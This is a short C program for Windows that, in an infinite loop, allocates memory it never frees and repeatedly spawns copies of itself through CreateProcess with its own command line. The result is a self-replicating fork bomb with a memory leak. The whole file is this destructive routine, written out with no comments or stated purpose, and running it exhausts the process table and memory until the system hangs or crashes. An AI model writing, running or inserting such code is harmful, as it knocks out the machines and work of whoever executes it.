#include <stdio.h>
#include <sys/types.h>
#include <Windows.h>


int main(int argc, char* argv[]) {

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

	while (1) {
		int* field = (int*)malloc(64 * sizeof(int));
		
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
  	}

	return 0;
}